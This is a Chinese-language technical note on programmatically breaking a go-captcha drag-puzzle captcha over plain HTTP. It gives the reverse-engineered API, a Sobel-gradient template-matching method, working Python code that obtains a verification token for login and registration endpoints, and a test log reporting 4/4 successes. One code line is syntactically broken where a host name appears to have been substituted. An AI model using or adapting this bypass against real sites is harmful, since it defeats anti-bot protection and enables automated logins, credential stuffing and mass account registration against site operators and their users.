## 打法：go-captcha 拼图(drag)验证码程序化破解（纯 HTTP，无需打码平台）

### 协议（自 example.com 前端 JS 逆向 + 实测）
1) POST /api/captcha {"scene":"login"} → {"data":{"captcha_key","image"(背景jpg b64),"tile"(半透明PNG b64),"tile_x","tile_y","tile_width","tile_height","expires_at"}}
2) POST /api/captcha/verify {"scene","captcha_key","x","y"} → 成功 {"data":{"token":"..."},"success":true}
   x,y = 拼图应放置的目标点(左上角坐标)，用图像匹配求出。
3) 后续敏感动作带请求头 X-Go-Captcha-Token:<token>（如 POST /api/user/login、/api/user/register；注册还有 ?turnstile= 参数位）。
注意：verify 每个 captcha_key 只能试 1 次，失败/过期须重新取图；敏感动作有 429 限速（连试会拉黑几分钟）。

### 求解算法（关键：用梯度边缘，不要用 RGB 像素匹配）
tile 是从背景目标处半透明混合抠出的，普通 RGB 模板匹配(TM_SQDIFF/CCORR+mask)全部 0 命中；
对 tile 和背景各取灰度 Sobel 梯度幅值，再做 TM_CCOEFF_NORMED 模板匹配取峰值 → 4/4 次一击通过。

### 最小可复现代码
```python
import httpx, base64, numpy as np, cv2
def gm(x):
    gx = cv2.Sobel(x, cv2.CV_32F, 1, 0, 3); gy = cv2.Sobel(x, cv2.CV_32F, 0, 1, 3)
    return np.sqrt(gx**2 + gy**2).astype(np.uint8)
c = httpx.Client(verify=False)
d = target459.example.com(BASE+"/api/captcha", json={"scene":"login"}).json()["data"]
bg = cv2.imdecode(np.frombuffer(base64.b64decode(d["image"].split(",",1)[1]), np.uint8), 1)
tile = cv2.imdecode(np.frombuffer(base64.b64decode(d["tile"].split(",",1)[1]), np.uint8), -1)
res = cv2.matchTemplate(gm(cv2.cvtColor(bg, cv2.COLOR_BGR2GRAY)),
                        gm(cv2.cvtColor(tile[:,:,:3], cv2.COLOR_BGR2GRAY)), cv2.TM_CCOEFF_NORMED)
_,_,_,loc = cv2.minMaxLoc(res)
v = target459.example.com(BASE+"/api/captcha/verify", json={"scene":"login","captcha_key":d["captcha_key"],"x":loc[0],"y":loc[1]}).json()
# v["success"]==True, token = v["data"]["token"] → X-Go-Captcha-Token 头使用
```
实测记录（example.com，2026-10-17）：4 个连续验证码 4/4 verify success:true；随后 /api/user/login 带 token 撞 429 限速（速率问题非破解问题）。